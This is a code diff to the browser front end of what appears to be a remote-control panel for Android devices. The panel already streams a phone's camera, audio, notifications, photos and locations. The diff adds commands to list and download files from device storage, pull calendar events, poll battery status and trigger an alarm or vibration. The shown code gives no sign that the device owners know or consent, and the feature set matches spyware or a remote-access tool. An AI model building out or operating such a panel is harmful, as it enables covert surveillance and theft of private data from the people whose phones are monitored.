@@ -128,6 +128,7 @@ function connectWS() {
       if (msg.type === 'video_frame') { pendingVideoFrame = true; document.getElementById('videoCameraLabel').textContent = `Camera: ${msg.camera}`; }
       if (msg.type === 'audio_frame') { pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 }; }
       if (msg.type === 'notification') { handleLiveNotification(msg); playBeep(); }
+      if (msg.type === 'battery_update') { handleBatteryUpdate(msg); }
     } catch (_) {}
   };
 }
@@ -388,6 +389,10 @@ function selectDevice(deviceId) {
   loadDevicePhotos(deviceId);
   loadDeviceLocations(deviceId);
   loadDeviceNotifications(deviceId);
+  loadBatteryHistory(deviceId);
+  loadCalendarEvents(deviceId);
+  loadDeviceFiles(deviceId);
+  startBatteryAutoRefresh();
   closeSidebar();
   // fetch actual name
   fetch(`${API_BASE}/api/devices`).then(r=>r.json()).then(devices=>{
@@ -417,6 +422,7 @@ function editDeviceName() {
 }
 function showDeviceList() {
   selectedDevice = null;
+  stopBatteryAutoRefresh();
   document.getElementById('deviceDetail').classList.add('hidden');
   document.getElementById('deviceList').classList.remove('hidden');
   document.getElementById('deviceList').parentElement.querySelector('.section-header').classList.remove('hidden');
@@ -705,6 +711,90 @@ async function loadDeviceNotifications(deviceId) {
   } catch (_) {}
 }
 async function deleteDeviceNotifications() { if (!selectedDevice) return; try { await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Cleared'); loadDeviceNotifications(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }
+
+// ===== New Feature Commands =====
+function sendAlarm() {
+  const ms = prompt('Alarm duration (ms):', '15000');
+  if (ms) sendCommand('PLAY_ALARM', { duration_ms: parseInt(ms) || 15000 });
+}
+function sendVibrate() {
+  const ms = prompt('Vibrate duration (ms):', '10000');
+  if (ms) sendCommand('VIBRATE_DEVICE', { duration_ms: parseInt(ms) || 10000 });
+}
+function listFiles() {
+  const path = prompt('Directory path:', '/storage/emulated/0');
+  if (path) sendCommand('LIST_FILES', { path });
+}
+function sendDownloadFile(filePath) {
+  sendCommand('DOWNLOAD_FILE', { file_path: filePath });
+}
+function refreshBattery() {
+  sendCommand('GET_BATTERY');
+}
+function fetchCalendar() {
+  sendCommand('GET_CALENDAR');
+}
+
+let batteryRefreshTimer = null;
+function startBatteryAutoRefresh() {
+  stopBatteryAutoRefresh();
+  refreshBattery();
+  batteryRefreshTimer = setInterval(refreshBattery, 30000);
+}
+function stopBatteryAutoRefresh() {
+  if (batteryRefreshTimer) { clearInterval(batteryRefreshTimer); batteryRefreshTimer = null; }
+}
+
+async function loadBatteryHistory(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/battery`);
+    const data = await res.json();
+    const container = document.getElementById('batteryHistory');
+    if (!container) return;
+    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No battery data yet</div>'; return; }
+    const latest = data[0];
+    document.getElementById('batteryLevel').textContent = latest.level + '%';
+    document.getElementById('batteryCharging').textContent = latest.is_charging ? 'Charging' : 'Not Charging';
+    document.getElementById('batteryHealth').textContent = latest.health || 'unknown';
+    document.getElementById('batteryTemp').textContent = latest.temperature ? latest.temperature + '°C' : '-';
+    document.getElementById('batteryTech').textContent = latest.technology || '-';
+    container.innerHTML = `<table><thead><tr><th>Level</th><th>Charging</th><th>Temp</th><th>Time</th></tr></thead><tbody>
+      ${data.slice(0, 20).map(b => `<tr><td>${b.level}%</td><td>${b.is_charging ? 'Yes' : 'No'}</td><td>${b.temperature ? b.temperature + '°C' : '-'}</td><td>${new Date(b.created_at).toLocaleString()}</td></tr>`).join('')}
+    </tbody></table>`;
+  } catch (_) {}
+}
+
+async function loadCalendarEvents(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/calendar`);
+    const data = await res.json();
+    const container = document.getElementById('calendarEvents');
+    if (!container) return;
+    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No calendar events found</div>'; return; }
+    container.innerHTML = `<table><thead><tr><th>Title</th><th>Date</th><th>Location</th></tr></thead><tbody>
+      ${data.slice(0, 50).map(e => `<tr><td>${escapeHtml(e.title || '')}</td><td>${e.start_time ? new Date(e.start_time).toLocaleString() : '-'}</td><td>${escapeHtml(e.event_location || '-')}</td></tr>`).join('')}
+    </tbody></table>`;
+  } catch (_) {}
+}
+
+async function loadDeviceFiles(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/files`);
+    const data = await res.json();
+    const container = document.getElementById('deviceFiles');
+    if (!container) return;
+    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No file data. Send LIST_FILES command first.</div>'; return; }
+    container.innerHTML = `<table><thead><tr><th>Name</th><th>Size</th><th>Type</th><th></th></tr></thead><tbody>
+      ${data.slice(0, 100).map(f => `<tr><td>${f.is_directory ? '📁 ' : '📄 '}${escapeHtml(f.file_name)}</td><td>${f.is_directory ? '-' : formatFileSize(f.file_size)}</td><td>${f.mime_type || '-'}</td><td>${!f.is_directory && f.file_size > 0 && f.file_size <= 20971520 ? `<button class="btn btn-glass btn-sm" onclick="sendDownloadFile('${f.file_path.replace(/'/g, "\\'")}')">DL</button>` : ''}</td></tr>`).join('')}
+    </tbody></table>`;
+  } catch (_) {}
+}
+
+function formatFileSize(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  return (bytes / 1048576).toFixed(1) + ' MB';
+}
 
 // ===== Toast =====
 function showToast(message, isError = false) {
